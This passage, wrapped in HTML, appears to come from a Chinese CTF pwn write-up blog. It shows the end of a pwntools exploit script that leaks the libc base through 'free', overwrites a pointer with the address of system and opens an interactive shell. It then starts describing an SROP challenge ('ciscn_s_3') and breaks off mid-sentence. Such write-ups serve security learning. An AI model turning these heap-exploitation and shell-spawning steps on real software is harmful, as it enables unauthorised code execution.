class="string">"description: "</span>)</span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">log.success(<span class="string">"libc: "</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system_addr:"</span> + hex(system_addr))</span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr),<span class="number">0x4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h3><p>考点在srop。</p><p>首先了解一下，在rax=15时会触发 SigreturnFrame ，又可以通过观察汇编，看到两次的栈空间都是0x10。而size位</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
